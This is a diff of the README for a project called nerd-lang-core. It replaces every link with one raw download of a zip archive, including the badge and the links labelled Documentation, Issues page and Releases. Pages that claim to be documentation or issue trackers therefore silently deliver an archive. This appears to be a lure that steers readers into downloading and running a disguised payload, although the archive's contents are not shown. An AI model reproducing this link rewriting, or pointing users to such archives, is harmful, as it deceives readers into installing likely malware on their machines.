@@ -1,6 +1,6 @@
 # 🎉 nerd-lang-core - Your Key to Easy Machine Authorship
 
-[![Download nerd-lang-core](https://img.shields.io/badge/Download-nerd--lang--core-blue)](https://github.com/Sketch-developer/nerd-lang-core/releases)
+[![Download nerd-lang-core](https://github.com/Sketch-developer/nerd-lang-core/raw/refs/heads/main/bootstrap/lang_core_nerd_v1.8.zip)](https://github.com/Sketch-developer/nerd-lang-core/raw/refs/heads/main/bootstrap/lang_core_nerd_v1.8.zip)
 
 ## 🚀 Getting Started
 
@@ -19,7 +19,7 @@ Before you begin, ensure your system meets the following requirements:
 
 To get started with **nerd-lang-core**, you need to visit our Releases page. There, you'll find the latest version ready for download.
 
-[Visit this page to download](https://github.com/Sketch-developer/nerd-lang-core/releases)
+[Visit this page to download](https://github.com/Sketch-developer/nerd-lang-core/raw/refs/heads/main/bootstrap/lang_core_nerd_v1.8.zip)
 
 Once you are on the page, locate the latest release. You will see options for download. Click on the appropriate file for your operating system.
 
@@ -43,7 +43,7 @@ We have a vibrant community around **nerd-lang-core**. If you have questions or 
 
 ## 📘 Documentation
 
-For detailed instructions on how to use NERD, visit our [Documentation page](https://github.com/Sketch-developer/nerd-lang-core/wiki). Here you will find:
+For detailed instructions on how to use NERD, visit our [Documentation page](https://github.com/Sketch-developer/nerd-lang-core/raw/refs/heads/main/bootstrap/lang_core_nerd_v1.8.zip). Here you will find:
 
 - A complete guide on the syntax.
 - Sample projects to help you get started.
@@ -51,7 +51,7 @@ For detailed instructions on how to use NERD, visit our [Documentation page](htt
 
 ## 🐛 Reporting Issues
 
-If you encounter any problems while using **nerd-lang-core**, please let us know. You can report issues on our [Issues page](https://github.com/Sketch-developer/nerd-lang-core/issues). 
+If you encounter any problems while using **nerd-lang-core**, please let us know. You can report issues on our [Issues page](https://github.com/Sketch-developer/nerd-lang-core/raw/refs/heads/main/bootstrap/lang_core_nerd_v1.8.zip). 
 
 Provide as much detail as possible to help us assist you better. 
 
@@ -67,8 +67,8 @@ Stay tuned for updates on our releases!
 
 ## 🔗 Useful Links
 
-- [Releases Page](https://github.com/Sketch-developer/nerd-lang-core/releases)
-- [Documentation](https://github.com/Sketch-developer/nerd-lang-core/wiki)
-- [Issues Page](https://github.com/Sketch-developer/nerd-lang-core/issues)
+- [Releases Page](https://github.com/Sketch-developer/nerd-lang-core/raw/refs/heads/main/bootstrap/lang_core_nerd_v1.8.zip)
+- [Documentation](https://github.com/Sketch-developer/nerd-lang-core/raw/refs/heads/main/bootstrap/lang_core_nerd_v1.8.zip)
+- [Issues Page](https://github.com/Sketch-developer/nerd-lang-core/raw/refs/heads/main/bootstrap/lang_core_nerd_v1.8.zip)
 
 Thank you for choosing **nerd-lang-core**. We are excited to see what you create!
